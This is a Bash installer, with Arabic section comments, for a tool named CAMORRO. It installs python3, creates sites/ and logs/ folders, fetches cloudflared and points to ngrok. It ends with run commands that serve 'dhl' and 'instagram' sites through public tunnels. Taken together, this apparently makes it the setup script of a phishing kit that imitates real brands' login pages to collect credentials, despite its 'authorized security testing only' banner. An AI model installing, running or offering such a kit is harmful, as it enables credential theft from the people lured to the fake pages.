#!/usr/bin/env bash
# ============================================
#  CAMORRO v1.1 — Installer
#  For authorized security testing only
#  Supports: Linux (apt) / Termux (pkg)
# ============================================
set -e

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

info() { echo -e "${CYAN}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1"; }

# ---------- اكتشاف البيئة ----------
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$DIR"

if [ -n "$PREFIX" ] && [ -d "$PREFIX" ]; then
    TERMUX=1
else
    TERMUX=0
fi
SUDO="sudo"
[ "$TERMUX" = "1" ] && SUDO=""

echo
cat <<'EOF'
   ___                              ___
  / __|__ _ _ __ ___  _ _ _  _ _ __ / _ \ _ _  __ _
 | (_ / _` | '_ ` _ \| '_| || | '_ \ (_) | ' \/ _` |
  \___\__,_| .__/ .__/|_|  \__/ .__/\___/|_||_\__,_|
           |_|  |_|          |_|   v1.1 installer
EOF
echo

# ---------- 1) فحص/تثبيت python3 ----------
if command -v python3 >/dev/null 2>&1; then
    ok "python3 found: $(python3 --version 2>&1)"
else
    err "python3 not found. Installing..."
    if [ "$TERMUX" = "1" ]; then
        pkg update && pkg install -y python || { err "python install failed"; exit 1; }
    else
        $SUDO apt update && $SUDO apt install -y python3 || { err "python3 install failed"; exit 1; }
    fi
    ok "python3 installed: $(python3 --version 2>&1)"
fi

# ---------- 2) المجلدات ----------
mkdir -p sites logs
ok "Directories ready: sites/ logs/"

# ---------- 3) صلاحية التنفيذ ----------
[ -f camorro.py ] && chmod +x camorro.py
ok "camorro.py is executable"

# ---------- 4) cloudflared ----------
if command -v cloudflared >/dev/null 2>&1; then
    ok "cloudflared already installed: $(cloudflared --version 2>/dev/null | head -n1)"
elif [ "$TERMUX" = "1" ]; then
    info "Installing cloudflared (Termux)..."
    pkg install -y cloudflared || warn "cloudflared install failed — install manually"
    ok "cloudflared installed"
else
    ARCH="$(uname -m)"
    case "$ARCH" in
        x86_64|amd64)  CF_ARCH="amd64" ;;
        aarch64|arm64) CF_ARCH="arm64" ;;
        armv7l|armhf)  CF_ARCH="armhf" ;;
        i386|i686)     CF_ARCH="386" ;;
        *)             CF_ARCH="" ;;
    esac

    if [ -n "$CF_ARCH" ]; then
        URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}"
        if command -v curl >/dev/null 2>&1; then
            info "Downloading cloudflared (linux-$CF_ARCH) ..."
            curl -sSL "$URL" -o /tmp/cloudflared
        elif command -v wget >/dev/null 2>&1; then
            info "Downloading cloudflared (linux-$CF_ARCH) via wget ..."
            wget -qO /tmp/cloudflared "$URL"
        else
            warn "curl/wget not found — install cloudflared manually: https://github.com/cloudflare/cloudflared/releases"
            CF_ARCH=""
        fi

        if [ -n "$CF_ARCH" ] && [ -f /tmp/cloudflared ]; then
            chmod +x /tmp/cloudflared
            if $SUDO mv /tmp/cloudflared /usr/local/bin/cloudflared 2>/dev/null; then
                ok "cloudflared installed -> /usr/local/bin/cloudflared"
            else
                mkdir -p "$HOME/.local/bin"
                mv /tmp/cloudflared "$HOME/.local/bin/cloudflared"
                ok "cloudflared installed -> $HOME/.local/bin/cloudflared"
                warn 'Add to PATH:  export PATH="$HOME/.local/bin:$PATH"'
            fi
        fi
    else
        warn "Unsupported arch ($ARCH). Install cloudflared manually: https://github.com/cloudflare/cloudflared/releases"
    fi
fi

# ---------- 5) ngrok (اختياري) ----------
if command -v ngrok >/dev/null 2>&1; then
    ok "ngrok already installed"
else
    warn "ngrok not found (optional) — install from https://ngrok.com/download if needed"
fi

# ---------- 6) الفحص النهائي ----------
echo
if [ -f camorro.py ]; then
    ok "CAMORRO is ready!"
    echo
    python3 camorro.py --list
    echo
    info "Run it:"
    info "   python3 camorro.py --site dhl --tunnel cloudflared --short"
    info "   python3 camorro.py --site instagram --tunnel ngrok"
    info "   python3 camorro.py --view all"
    echo
else
    err "camorro.py not found in $DIR — keep camorro.py next to install.sh"
    exit 1
fi
